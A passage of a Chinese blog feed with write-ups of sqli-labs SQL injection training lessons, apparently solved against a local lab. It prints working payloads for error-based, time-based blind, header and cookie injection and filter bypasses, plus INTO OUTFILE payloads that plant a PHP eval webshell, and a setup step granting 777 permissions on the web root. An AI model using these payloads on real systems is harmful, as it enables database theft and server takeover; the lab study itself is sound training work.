src="./13.png" srcset="/img/loading.gif" alt=""></li></ul><p>想着接着试试报错注入或延时注入，但是报错注入有die()限制,延时注入有数据库字段长度限制都无法成功，GG<br><img src="./14.png" srcset="/img/loading.gif" alt=""><br><img src="./15.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x03-less25"><a href="#0x03-less25" class="headerlink" title="0x03 less25"></a>0x03 less25</h2><p><img src="./16.png" srcset="/img/loading.gif" alt=""><br>目的：绕过 OR&amp;AND 过滤<br><img src="./17.png" srcset="/img/loading.gif" alt=""></p><p>绕过思路：<br>（1）大小写变形 Or,OR,oR<br>（2）编码，hex，urlencode<br>（3）添加注释/<em>or</em>/<br>（4）利用符号 and=&amp;&amp; or=||<br>（5）双写绕过<br>payload：id=1’ || extractvalue(1,concat(0x7e,database(),0x7e))–+<br><img src="./18.png" srcset="/img/loading.gif" alt=""></p><p>双写绕过：oorrder by 3–+<br><img src="./19.png" srcset="/img/loading.gif" alt=""></p><p>注释绕过 apache下解析不出来/**/ %00.猜想应该是PHP版本原因<br><img src="./20.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x04-less-25a"><a href="#0x04-less-25a" class="headerlink" title="0x04 less-25a"></a>0x04 less-25a</h2><p>与less-25相同 差别在$id值是整型<br>同样可用||&amp;&amp; 替换and or</p><h2 id="0x05-less-26"><a href="#0x05-less-26" class="headerlink" title="0x05 less-26"></a>0x05 less-26</h2><p>该关卡把空格过滤<br>1.编写fuzz测试可用hex<br>2.借用fuzz脚本的可用替换，构造extractvalue报错注入<br><code>http://127.0.0.1/sqlilabs/Less-26/?id=1%27%0a||%0aextractvalue(1,concat(0x7e,(select%20@@datadir),0x7e))%0a||%0a%271%27=%271</code><br>联合注入，延时注入都是OK的<br><img src="./21.png" srcset="/img/loading.gif" alt=""></p><p>在UBUNTU下利用FUZZ查看联合查询可用绕过注入<br>争对<code>union select 1,user,2;</code><br><img src="./22.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x06-less-26a"><a href="#0x06-less-26a" class="headerlink" title="0x06 less-26a"></a>0x06 less-26a</h2><p>该题的payload:1’) || (‘1’)=(‘1<br>到这个地方就开始对HEx解析异常，转用ubuntu系统<br>构造payload:<br><code>id=100%27)%a0union%a0select%a01,user(),(%273</code><br><img src="./23.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x07-less-27"><a href="#0x07-less-27" class="headerlink" title="0x07 less-27"></a>0x07 less-27</h2><p>过滤代码如下</p><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">blacklist</span><span class="hljs-params">($id)</span></span><span class="hljs-function"></span>&#123;$id= preg_replace(<span class="hljs-string">'/[\/\*]/'</span>,<span class="hljs-string">""</span>, $id);<span class="hljs-comment">//strip out /*</span>$id= preg_replace(<span class="hljs-string">'/[--]/'</span>,<span class="hljs-string">""</span>, $id);<span class="hljs-comment">//Strip out --.</span>$id= preg_replace(<span class="hljs-string">'/[#]/'</span>,<span class="hljs-string">""</span>, $id);<span class="hljs-comment">//Strip out #.</span>$id= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out spaces.</span>$id= preg_replace(<span class="hljs-string">'/select/m'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out spaces.</span>$id= preg_replace(<span class="hljs-string">'/[ +]/'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out spaces.</span>$id= preg_replace(<span class="hljs-string">'/union/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out union</span>$id= preg_replace(<span class="hljs-string">'/select/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out select</span>$id= preg_replace(<span class="hljs-string">'/UNION/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out UNION</span>$id= preg_replace(<span class="hljs-string">'/SELECT/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out SELECT</span>$id= preg_replace(<span class="hljs-string">'/Union/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out Union</span>$id= preg_replace(<span class="hljs-string">'/Select/s'</span>,<span class="hljs-string">""</span>, $id);    <span class="hljs-comment">//Strip out select</span><span class="hljs-keyword">return</span> $id;&#125;</code></pre><p>采用对UNION SELECT 大小写混写绕过注入<br><img src="./24.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x08-less27a"><a href="#0x08-less27a" class="headerlink" title="0x08 less27a"></a>0x08 less27a</h2><p>将less-27 单引号改为双引号就OK了<br><img src="./25.png" srcset="/img/loading.gif" alt=""></p><h2 id="0x09-less-28-28a"><a href="#0x09-less-28-28a" class="headerlink" title="0x09 less-28|28a"></a>0x09 less-28|28a</h2><p>过滤（union select）组合字符串，利用fuzz进行测试<br><img src="./26.png" srcset="/img/loading.gif" alt=""><br><img src="./27.png" srcset="/img/loading.gif" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li>fuzz脚本的编写有利于对绕过字符的猜解，不用一个个盲注。</li><li>PHP的正则表达式在其中起到重要作用一定要认真学习</li><li>多编写python脚本有利于理解sql注入</li><li>以上都是比较简单的waf防注入，还是需要多练习。fighting</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ubuntu(LAMP)</title>
    <link href="/2018/12/22/ubuntu-LAMP-SQLILABS/"/>
    <url>/2018/12/22/ubuntu-LAMP-SQLILABS/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Ubuntu-LAMP搭建"><a href="#0x01-Ubuntu-LAMP搭建" class="headerlink" title="0x01 Ubuntu_LAMP搭建"></a>0x01 Ubuntu_LAMP搭建</h1><p>ubuntuLAMP搭建参照成敏学长博客：<a href="https://mochazz.github.io/2017/07/13/LAMP/" target="_blank" rel="noopener">https://mochazz.github.io/2017/07/13/LAMP/</a></p><h2 id="LAMP命令备忘录："><a href="#LAMP命令备忘录：" class="headerlink" title="LAMP命令备忘录："></a>LAMP命令备忘录：</h2><ol><li>更新源：<code>apt-get update</code></li><li>安装装apche2：<code>apt-get install apache2 -y</code></li><li>安装mysql:<code>apt-get install mysql_server -y</code></li><li>安装php5.6:(注意这里就不要执行apt-get install php,会造成麻烦)<pre><code class="hljs smali">apt-get install -y language-pack-en-baseLC_ALL=en_US.UTF-8<span class="hljs-built_in"> add-apt-repository </span>ppa:ondrej/phpadd-apt-repository ppa:ondrej/phpapt-get updateapt-cache search php5apt-get install php5.6-common -yapt-get install libapache2-mod-php5.6 -y</code></pre>安装扩展插件：<pre><code class="hljs angelscript">apt-<span class="hljs-keyword">get</span> install php5<span class="hljs-number">.6</span> php5<span class="hljs-number">.6</span>-cgi php5<span class="hljs-number">.6</span>-cli php5<span class="hljs-number">.6</span>-phpdbg php5<span class="hljs-number">.6</span>-fpm php5<span class="hljs-number">.6</span>-dev php5<span class="hljs-number">.6</span>-common php5<span class="hljs-number">.6</span>-curl php5<span class="hljs-number">.6</span>-gd php5<span class="hljs-number">.6</span>-imap php5<span class="hljs-number">.6</span>-<span class="hljs-built_in">int</span>l php5<span class="hljs-number">.6</span>-ldap php5<span class="hljs-number">.6</span>-mysql php5<span class="hljs-number">.6</span>-pspell php5<span class="hljs-number">.6</span>-recode php5<span class="hljs-number">.6</span>-snmp php5<span class="hljs-number">.6</span>-sqlite3 php5<span class="hljs-number">.6</span>-sybase php5<span class="hljs-number">.6</span>-tidy php5<span class="hljs-number">.6</span>-opcache php5<span class="hljs-number">.6</span>-json php5<span class="hljs-number">.6</span>-bz2 php5<span class="hljs-number">.6</span>-mcrypt php5<span class="hljs-number">.6</span>-odbc php5<span class="hljs-number">.6</span>-readline php5<span class="hljs-number">.6</span>-<span class="hljs-built_in">int</span>erbase php5<span class="hljs-number">.6</span>-xmlrpc php5<span class="hljs-number">.6</span>-enchant php5<span class="hljs-number">.6</span>-gmp php5<span class="hljs-number">.6</span>-xsl php5<span class="hljs-number">.6</span>-bcmath php5<span class="hljs-number">.6</span>-mbstring php5<span class="hljs-number">.6</span>-soap php5<span class="hljs-number">.6</span>-xml php5<span class="hljs-number">.6</span>-dba</code></pre></li><li>赋予<code>/var/www/html 777权限:chmod 777 /html</code></li><li>拖入sqlilabs与/var/www/html中</li></ol><h1 id="0x02-ubuntu网速优化"><a href="#0x02-ubuntu网速优化" class="headerlink" title="0x02 ubuntu网速优化"></a>0x02 ubuntu网速优化</h1><ol><li>解决网速问题：<code>sudo gedit /etc/modprobe.d/iwlwifi.conf</code><br>文件下写入保存：<code>options iwlwifi 11n_disable=1</code></li><li>切换跟新源，选择国内<br>在<code>setting system</code>中打开（可解决apt-get update 更新出错）</li></ol><h1 id="0x03-ubuntu——python环境搭建"><a href="#0x03-ubuntu——python环境搭建" class="headerlink" title="0x03 ubuntu——python环境搭建:"></a>0x03 ubuntu——python环境搭建:</h1><ol><li>python3 环境切换 <code>alias python=&#39;/usr/bin/python3.4(根据需要更换)&#39;</code></li><li>pip 安装<code>sudo apt-get install python3-pip</code><br> //卸载命令： <code>sudo apt-get remove python3-pip</code></li><li>pip3 install 提示 no mudle<br>修改文件<strong>main</strong>函数<br><img src="./1.png" srcset="/img/loading.gif" alt=""></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilabs17-22</title>
    <link href="/2018/12/20/sqlilabs17-22/"/>
    <url>/2018/12/20/sqlilabs17-22/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-增删改基本语法"><a href="#0x01-增删改基本语法" class="headerlink" title="0x01 增删改基本语法"></a>0x01 增删改基本语法</h1><h3 id="插入操作"><a href="#插入操作" class="headerlink" title="插入操作"></a>插入操作</h3><p>本质含义，将数据以SQL的形式存储到指定的数据表（字段）<br><code>Insert into 表名 [(字段列表)] values;</code></p><h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>删数据：</p><ul><li><p><code>delete from 表名</code></p></li><li><p><code>delete from 表名 where id=16</code></p></li></ul><p>删结构：</p><ul><li><p>删数据库：drop database 数据库名; </p></li><li><p>删除表：drop table表名; </p></li><li><p>删除表中的列:alter table表名drop column列名;</p></li></ul><h3 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h3><p><code>updata 表名 set 字段名 = 新值 [where 条件] ，非数字加引号；</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x02-less-17进入addslashes函数世界"><a href="#0x02-less-17进入addslashes函数世界" class="headerlink" title="0x02 less-17进入addslashes函数世界"></a>0x02 less-17进入addslashes函数世界</h1><p>开始正题<br>uname=admin<br>passwd=1’ 可得如图报错<br>在passwd处有单引号，构造payload: <code>1&#39;#</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>Xpath报错注入：<code>uname=admin&amp;passwd=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))#&amp;submit=Submit</code>，其他盲注也是OK就不啰嗦了。<br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><p>源码对unname字符进行转义处理无法使用uname注入</p><h1 id="0x03-addslashes函数学习"><a href="#0x03-addslashes函数学习" class="headerlink" title="0x03 addslashes函数学习"></a>0x03 addslashes函数学习</h1><ol><li><p><code>addslashes()</code>：为数据库查询语句需要的某些字符添加反斜线转义。单引号（’）、双引号（”）、反斜线（\）与 NUL（NULL 字符）。强烈建议使用 DBMS 指定的转义函数 （比如 MySQL 是<code>mysqli_real_escape_string()</code>，PostgreSQL 是 <code>pg_escape_string()</code>）</p></li><li><p>使用<code>get_magic_quotes_gpc()</code>检验PHP是否开启<code>magic_quotes_gpc</code>,即是否执行<code>addslashes()</code>.<br><code>mysqli_real_escape_string()</code>受影响的字符为：\x00, \n, \r, , ‘, “ 和 \x1a.</p></li><li><p><code>ctype_digit($value)</code>:判断value是否为纯数字</p></li><li><p><code>stripslashes()</code>:反引用一个引用字符串。如果 <code>magic_quotes_sybase</code> 项开启，反斜线将被去除，但是两个反斜线将会被替换成一个。<br><img src="./4.png" srcset="/img/loading.gif" alt=""><br><img src="./5.png" srcset="/img/loading.gif" alt=""></p></li></ol><h1 id="0x04-less-18拐进HTTP头部世界"><a href="#0x04-less-18拐进HTTP头部世界" class="headerlink" title="0x04 less-18拐进HTTP头部世界"></a>0x04 less-18拐进HTTP头部世界</h1><p>本节开始学习header injection<br>查看源代码发现传入的uname 和 passwd特殊字符都被addslashes函数转义。<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br>HTTP头部学习：<br>1、<code>Aceept</code>：告诉WEB服务器自己接收什么介质类型，<em>/</em>表示任何类型，type/*表示该类型下的所有自类型<br>2、<code>Accept-Charset</code>：浏览器申明自己接收的字符集<br>    <code>Accept-Encoding</code>: 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法(gzip,deflate)<br>    <code>Accept-Language</code>：浏览器申明自己接收的语言。big5,gb2312,gbk<br>3、<code>Connetion</code>：浏览器与服务器之间连接的类型<br>4、<code>Cookie</code>：当前页面设置的cookie<br>5、<code>Host</code>：客户端指定自己想访问的 WEB 服务器的域名/IP 地址和端口号。例如：Host： rss.sina.com.cn<br>6、<code>Referer</code>：发出请求的页面的URI。<br>7、<code>User-Agent</code>：浏览器的用户代理字符串<br>8、<code>Server</code>: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)</p><h4 id="源代码学习："><a href="#源代码学习：" class="headerlink" title="源代码学习："></a>源代码学习：</h4><p><code>$_SERVER</code>[ ]:返回HTTP头部信息。<br>参数:</p><ul><li><code>HTTP_USER_AGENT</code>：返回HTTP头部的<code>USER_AGENT</code></li><li><code>REMOTE_ADDR</code>：返回http头部IP地址<br><img src="./7.png" srcset="/img/loading.gif" alt=""></li></ul><p>判断uname和passwd是否匹配<br><img src="./8.png" srcset="/img/loading.gif" alt=""></p><p>匹配成功之后插入到数据库(符号` 在数据库合法，表示字符串的含义)<br><img src="./9.png" srcset="/img/loading.gif" alt=""></p><p>正确信息回显<code>your user agent is :..</code> 可知采用<code>header injection</code><br><img src="./10.png" srcset="/img/loading.gif" alt=""></p><p>payload构造：<code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &#39;1&#39; = &#39;1</code> /<br>            <code>&#39;and extractvalue(1,concat(0x7e,(select @@version),0x7e))#</code><br>            *：红色的首末两个个引号起到闭合引号的作用，使得extractvalue语句不会是字符串形式。<br><img src="./11.png" srcset="/img/loading.gif" alt=""></p><p>爆数据库<code>&#39;and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e))  and &#39;1&#39;=&#39;1</code><br>bool盲注：<code>&#39;or if(ascii(substr((select database()),1,1))=114,1,sleep(5))  and &#39;1&#39;=&#39;1（and不管用）</code><br><img src="./12.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x05-less-19"><a href="#0x05-less-19" class="headerlink" title="0x05 less-19"></a>0x05 less-19</h1><p>正确登陆回显<code>Your Referer is: http://127.0.0.1/sqlilabs/Less-19</code><br>可以判断为header injection -<code>Referer</code> 为注入点<br>原始语句：<code>Referer: http://127.0.0.1/sqlilabs/Less-19/</code><br><img src="./13.png" srcset="/img/loading.gif" alt=""></p><p>payload语句：传入字符串所以需要对引号进行闭合。<br><code>&#39;and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#39;1&#39;=&#39;1</code><br><code>&#39;and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#39;1&#39;=&#39;1</code><br><img src="./14.png" srcset="/img/loading.gif" alt=""><br><img src="./15.png" srcset="/img/loading.gif" alt=""><br>其他注入点就不一一赘述了。</p><h1 id="0x05-less-20-cookie小海浪"><a href="#0x05-less-20-cookie小海浪" class="headerlink" title="0x05 less-20 cookie小海浪"></a>0x05 less-20 cookie小海浪</h1><p><code>cookie</code>：GET请求所携带的用户信息，结构为–键,值,时间<br>网页正确回显依赖数据库对cookie的验证。构造cookie dump</p><ul><li>payload：<code>‘and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and &#39;1&#39;=&#39;1</code><br><img src="./16.png" srcset="/img/loading.gif" alt=""><br><img src="./17.png" srcset="/img/loading.gif" alt=""></li></ul><h4 id="源码学习与分析："><a href="#源码学习与分析：" class="headerlink" title="源码学习与分析："></a>源码学习与分析：</h4><p>输入正确的账号密码，执行setcookie(‘uname’,$cookee,time()+3600)函数，跳转界面（刷新）<br><img src="./18.png" srcset="/img/loading.gif" alt=""></p><p>重新打开网页，浏览器从硬盘上取出<code>cookie$_COOKIE[&#39;uname&#39;]</code>。页面显示cookie状态信息，执行的条件是<code>submit</code>事件不被触发。<br>—&gt;将<code>$cookee</code>传入到数据库中判断语法是否错误，<code>cookee</code>值是否与数据库字段匹配（这一步操作在现实中应该是在一定程度上保证cookie值不被恶意构造）<br><img src="./19.png" srcset="/img/loading.gif" alt=""><br>若<code>submit</code>事件触发则删除<code>cookie</code>值<br><img src="./20.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x06-less-21-试试一句话"><a href="#0x06-less-21-试试一句话" class="headerlink" title="0x06 less-21 试试一句话"></a>0x06 less-21 试试一句话</h1><p>正常登陆之后<br><img src="./21.png" srcset="/img/loading.gif" alt=""></p><p>使用burpsuite抓包，传入的uname经过base64编码<br><img src="./22.png" srcset="/img/loading.gif" alt=""></p><p>爆数据库目录：payload:’)and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) and (‘1’)=(‘1<br><img src="./23.png" srcset="/img/loading.gif" alt=""></p><p>传入一句话<br>*：union 查询条件前列数相同且前一句sql语句能执行,不同与报错盲注<br>payload：<code>admin&#39;) union select 1,&#39;&lt;?php @eval($_POST[&quot;mima&quot;])?&gt;&#39;,3 into outfile &quot;F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-21\\1.php&quot;#</code><br><img src="./24.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x07-less-22-e…"><a href="#0x07-less-22-e…" class="headerlink" title="0x07 less-22 e…."></a>0x07 less-22 e….</h1><p>payload: <code>admin1&quot;and extractvalue(1,concat(0x7e,(selectdatabase()),0x7e))#</code><br>其他就和less-21相同就不一一赘述了</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql双查询注入</title>
    <link href="/2018/12/20/sql%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/"/>
    <url>/2018/12/20/sql%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-函数知识点"><a href="#0x01-函数知识点" class="headerlink" title="0x01 函数知识点"></a>0x01 函数知识点</h1><p>rand():产生随机数,有参数如rand(0) 产生同一个数<br>floor():向下舍入为指定小数位数 如：floor(3.45)&gt;&gt;3 最接近的较小整数（floor地板的意思）<br>group by:以某一规则排列字段值<br><img src="./1.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x02-造错解析"><a href="#0x02-造错解析" class="headerlink" title="0x02 造错解析"></a>0x02 造错解析</h1><p><code>参考文献：https://www.2cto.com/article/201604/498394.html</code></p><p>报错语句中count(),group by ,floor(),rand()充当的作用</p><ul><li><p>count():统计键的值。</p></li><li><p>group by :建立虚拟表，group by x 中的x作为键。</p></li><li><p>rand(0):持续产生相同的数值，但产生不同的0或1，其实有点困惑待解答。。。</p></li><li><p>floor(rand(0)*2):计算0和1值，作为键。</p></li></ul><p>报错流程：mysql因group by建立虚拟表，count()会统计并计算floor(rand(0)<em>2)值，每统计一次,floor(rand(0)</em>2)就被执行一次。当出现重复的键，sql出现报错。</p><p>sql语句可编辑为：<code>select count(*),concat(0x7e,(select database()),0x7e),floor(rand(0)*2))x from information_schema.tables group by x;;</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>若要查询表的话就要考虑数据数量对表造成的影响，需要添加limit 0,1<br><code>select concat(0x7e,(select table_name from information_schema.tables limit 0,1),0x7e,floor(rand(0)*2))x,count(*) from information_schema.schemata group by x;</code></p><p>总而言之：双查询注入cout(),group by,floor(),rand()缺一不可</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilabs11-16</title>
    <link href="/2018/12/20/sqlilabs11-16/"/>
    <url>/2018/12/20/sqlilabs11-16/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-Firefox插件使用"><a href="#0x01-Firefox插件使用" class="headerlink" title="0x01 Firefox插件使用"></a>0x01 Firefox插件使用</h1><p>新版FIREfox hackbar无法正常使用。<br>1.下载firefox for xp<br>2.下载旧版 HACKbar<br>3.地址栏输入about:config，搜索xpinstall.signatures.required，右键，切换，值改为false，即可。</p><h1 id="0x02-POST注入"><a href="#0x02-POST注入" class="headerlink" title="0x02 POST注入"></a>0x02 POST注入</h1><ul><li><p><code>less-11</code><br>username 与 password 都正确返回登入成功信息<code>&gt;&gt;</code>查询语句WHERE为真就会执行sql语句<br>构造payload:<br>  <code>username=admin&#39;#</code><br>  <code>password=123</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>爆库<br><img src="./2.png" srcset="/img/loading.gif" alt=""><br>BOOL注入<br>uname=-1’ or if(ascii(substr(database(),1,1))=114,1,sleep(5))#<br><img src="./3.png" srcset="/img/loading.gif" alt=""><br>XML函数报错<br><img src="./4.png" srcset="/img/loading.gif" alt=""></p></li><li><p><code>less-12</code><br>构造payload:  d”) or 1=1#<br>其他与less11相同</p></li><li><p><code>less-13</code><br>要求使用双查询注入<br>构造payload  : uname=1’) or 1=1#<br>为了更直观直接 在源代码中echo $sql语句<br>POST data : uname=1’) union select count(<em>),concat(0x7e,(select database()),0x7e,floor(rand(0)</em>2))x from information_schema.tables group by x#&amp;passwd=&amp;submit=Submit<br><img src="./6.png" srcset="/img/loading.gif" alt=""></p></li><li><p><code>less-14</code><br>与less-13相同，payload ： 1” or 1=1#</p></li><li><p><code>less-15</code><br>无回显错误信息，基于布尔时间的报错<br>payload:1’ or 1=1#<br>uname=1’ or if(ascii(substr((select table_name from information_schema.tables where database() limit 0,1),1,1))=115,1,sleep(5))#&amp;passwd=1&amp;submit=Submit<br><img src="./7.png" srcset="/img/loading.gif" alt=""></p></li><li><p><code>less-16</code><br>与less-15相同 不同payload为 : 1”) or 1=1#</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilabs_less7-10</title>
    <link href="/2018/12/18/sqlilabs-less7-10/"/>
    <url>/2018/12/18/sqlilabs-less7-10/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-sql导入导出相关操作知识"><a href="#0x01-sql导入导出相关操作知识" class="headerlink" title="0x01 sql导入导出相关操作知识"></a>0x01 sql导入导出相关操作知识</h1><p>执行一句话或者文件传入的要求：<br>                            1.绝对物理路径<br>                            2.构造有效的畸形语句（报错爆出绝对路径）<br>传入一句话：<br><code>select &quot;&lt;?php @eval($_post[&quot;mima&quot;])?&gt;&quot; into outfile &quot;F:\\phpstudy\\PHPTutorail\\WWW\\3.php&quot;</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""><br>系统自创建3.php，填入一句话字符串<br><strong>//很重要 这里一句话一句 post数组中的单引号 那么一句话就要用双引号才能正确输入。</strong></p><h2 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h2><p>less7要求dump file<br>需要把一句话成功写入到数据库中。需要晓得表有几列<br>order by &gt;&gt; 三列<br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>构造一句话payload:<br><code>http://127.0.0.1/sqlilabs/Less-7/?id=1%27))union%20select%201,2,%27%3C?php%20@eval($_post[%22mima%22])?%3E%27%20into%20outfile%20%27F:\\phpstudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\sen.php%27--+</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""></p><h2 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h2><p>通过id构造发现id=1’没有显示错误信息，应该是php对错误隐藏<br>根据boolean报错构造payload<br><code>IF(ASCII(substr(database(),1,1))=115,1,sleep(5))</code><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h2 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h2><p>不存正确错误与否都都市输出you are in…有点头大 ，（偷偷看了源代码,less-8变形）<br><img src="./5.png" srcset="/img/loading.gif" alt=""><br>看了下博客，看来还是得好好挖掘下题目信息<br><img src="./6.png" srcset="/img/loading.gif" alt=""><br>由于输入什么都是you are in… 只能根据sleep()函数得到我们所要的信息了<br><img src="./7.png" srcset="/img/loading.gif" alt=""><br>根据 sleep 一个个爆数据库名 表 列 字段 ：个数&gt;&gt;每个长度&gt;&gt;每个字段</p><h2 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h2><p>less-10与 less-9 就差个 （‘）转变为 (“)</p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlilabs_盲注之布尔和报错</title>
    <link href="/2018/12/18/sqlilabs-%E7%9B%B2%E6%B3%A8%E4%B9%8B%E5%B8%83%E5%B0%94%E5%92%8C%E6%8A%A5%E9%94%99/"/>
    <url>/2018/12/18/sqlilabs-%E7%9B%B2%E6%B3%A8%E4%B9%8B%E5%B8%83%E5%B0%94%E5%92%8C%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[<p>知识点补充：<br>extractvalue和upadatexml 函数返回ture or false<br>    extractvalue语法:   extractvalue(目标xml文档，xml路径)&gt;&gt;通过xml路径语法错误实现sql报错注入<br>    upadatexml语法:    updatexml(XML_DOCUMENT,XPATH_STRING,NEW_VALUE);<br>    第一个参数：XML_DOCUMENT是STRING格式，为XML文档对象的名称<br>    第二个参数：xPATCH_string(Xpath格式的字符串)<br>    第三个参数：new_value,Stirng格式，替换查找到的符合条件的数据。作用改变文档中符合条件的节点值</p><pre><code>concat():拼接不同列内容，分行group_concat():拼接不同列内容，整合为一行</code></pre><h1 id="0x01-基于报错的SQL盲注"><a href="#0x01-基于报错的SQL盲注" class="headerlink" title="0x01 基于报错的SQL盲注"></a>0x01 基于报错的SQL盲注</h1><p><code>构造payload使得所需信息通过错误回显</code></p><h3 id="1-Xpath函数报错"><a href="#1-Xpath函数报错" class="headerlink" title="1. Xpath函数报错"></a>1. Xpath函数报错</h3><p>extractvalue函数payload<br><code>extractvalue(1,concat(0x7e,(select @@verion),0x7e))</code><br><img src="./1.png" srcset="/img/loading.gif" alt=""><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p><p>updatexml函数payload<br><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code><br><img src="./3.png" srcset="/img/loading.gif" alt=""><br><img src="./4.png" srcset="/img/loading.gif" alt=""></p><h3 id="2-数据重复性错误"><a href="#2-数据重复性错误" class="headerlink" title="2. 数据重复性错误"></a>2. 数据重复性错误</h3><p>payload:<br><code>select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code><br><img src="./5.png" srcset="/img/loading.gif" alt=""><br><img src="./6.png" srcset="/img/loading.gif" alt=""></p><h1 id="0x02-延时注入"><a href="#0x02-延时注入" class="headerlink" title="0x02 延时注入"></a>0x02 延时注入</h1><p>利用sleep()函数进行注入<br>    IF(a,b,c):如果a为真执行b,为假执行c<br>payload:<code>http://127.0.0.1/sqllib/Less-5/?id=1&#39;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code><br><img src="./7.png" srcset="/img/loading.gif" alt=""><br><img src="./8.png" srcset="/img/loading.gif" alt=""><br><img src="./9.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sqlless1-4</title>
    <link href="/2018/12/18/sqlless1-4/"/>
    <url>/2018/12/18/sqlless1-4/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-sql语句执行"><a href="#0x01-sql语句执行" class="headerlink" title="0x01 sql语句执行"></a>0x01 sql语句执行</h1><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./1.png" srcset="/img/loading.gif" alt=""><br>sql查询语句执行流程：1.sql语句传入到mysql_query()中返回resource值<br>                    2.mysql_fetch_array()返回一个数组</p><h1 id="0x02-sql引号概述"><a href="#0x02-sql引号概述" class="headerlink" title="0x02 sql引号概述"></a>0x02 sql引号概述</h1><p><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./2.png" srcset="/img/loading.gif" alt=""> </p><ol><li>传入id=1’返回报错信息，可知sql后半段为limit 0,1。采用去引号注释方法 <code>&#39;or 1=1--+</code><br> (引号的作用使得注入的语句能够插入进sql语句中)</li><li>通过id=1’ order by 4 &gt;&gt; 得出 列数为三</li><li>通过id=-1’ uniongg select 1,database(),3 &gt;&gt; 可得数据库名 （这里id=-1的作用是，前端语句查询不存在而执行union语句）<br><img src="%E4%BD%A0%E5%A5%BD%EF%BC%8C./3.png" srcset="/img/loading.gif" alt=""><br>在id=1后加引号的作用如上图所示，若不加引号 id后的sql语句会被包含在id=’’字符串的单引号中而无法实现。在添加一个向后单引号会使得union查询语句置后。</li></ol><h1 id="0x03-sql注入爆库表列"><a href="#0x03-sql注入爆库表列" class="headerlink" title="0x03 sql注入爆库表列"></a>0x03 